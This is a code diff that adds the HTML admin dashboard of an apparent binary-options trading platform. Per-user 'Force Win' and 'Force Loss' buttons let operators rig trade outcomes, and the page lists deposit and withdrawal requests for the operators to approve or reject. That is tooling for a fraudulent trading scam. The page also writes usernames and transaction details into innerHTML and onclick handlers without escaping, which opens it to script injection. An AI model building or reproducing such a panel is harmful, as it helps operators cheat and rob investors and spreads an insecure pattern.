@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Dashboard - Binary Control</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body style="padding: 20px;">
+    <h2>👑 Admin Control Panel</h2>
+    <div class="admin-stats">
+        <div class="stat-card">Total Deposit (24h): $<span id="totDep">0</span></div>
+        <div class="stat-card">Total Withdraw (24h): $<span id="totWd">0</span></div>
+    </div>
+
+    <h3>User Management & Win/Loss Control</h3>
+    <table border="1" style="width:100%; border-collapse: collapse; background:#1e222d; color:#fff;" id="userTable">
+        <tr>
+            <th>Username</th>
+            <th>Balance</th>
+            <th>Current Control</th>
+            <th>Action Control</th>
+        </tr>
+    </table>
+
+    <h3 style="margin-top: 30px;">Deposit & Withdrawal Requests</h3>
+    <table border="1" style="width:100%; border-collapse: collapse; background:#1e222d; color:#fff;" id="txTable">
+        <tr>
+            <th>User</th>
+            <th>Type</th>
+            <th>Method</th>
+            <th>Amount</th>
+            <th>Details (TrxID/Acc)</th>
+            <th>Status</th>
+            <th>Action</th>
+        </tr>
+    </table>
+
+    <script>
+        function loadAdminData() {
+            fetch('/api/admin/data')
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('totDep').innerText = data.totalDeposit;
+                document.getElementById('totWd').innerText = data.totalWithdraw;
+
+                let userHtml = `<tr><th>Username</th><th>Balance</th><th>Current Control</th><th>Action Control</th></tr>`;
+                for(let uname in data.users) {
+                    let u = data.users[uname];
+                    userHtml += `<tr>
+                        <td>${uname}</td>
+                        <td>$${u.balance.toFixed(2)}</td>
+                        <td><b>${u.control.toUpperCase()}</b></td>
+                        <td>
+                            <button onclick="setUserControl('${uname}', 'win')" style="background:green; color:white;">Force Win</button>
+                            <button onclick="setUserControl('${uname}', 'loss')" style="background:red; color:white;">Force Loss</button>
+                            <button onclick="setUserControl('${uname}', 'normal')" style="background:gray; color:white;">Normal</button>
+                        </td>
+                    </tr>`;
+                }
+                document.getElementById('userTable').innerHTML = userHtml;
+
+                let txHtml = `<tr><th>User</th><th>Type</th><th>Method</th><th>Amount</th><th>Details</th><th>Status</th><th>Action</th></tr>`;
+                data.transactions.forEach(tx => {
+                    txHtml += `<tr>
+                        <td>${tx.username}</td>
+                        <td>${tx.type}</td>
+                        <td>${tx.method}</td>
+                        <td>$${tx.amount}</td>
+                        <td>${tx.trxId || tx.accountNo}</td>
+                        <td>${tx.status}</td>
+                        <td>
+                            <button onclick="txAction(${tx.id}, 'Approved')" style="background:green; color:white;">Approve</button>
+                            <button onclick="txAction(${tx.id}, 'Rejected')" style="background:red; color:white;">Reject</button>
+                        </td>
+                    </tr>`;
+                });
+                document.getElementById('txTable').innerHTML = txHtml;
+            });
+        }
+
+        function setUserControl(username, state) {
+            fetch('/api/admin/action', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, action: 'control', value: state })
+            }).then(() => loadAdminData());
+        }
+
+        function txAction(txId, status) {
+            fetch('/api/admin/tx-action', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ txId, status })
+            }).then(() => loadAdminData());
+        }
+
+        setInterval(loadAdminData, 3000);
+        loadAdminData();
+    </script>
+</body>
+</html>
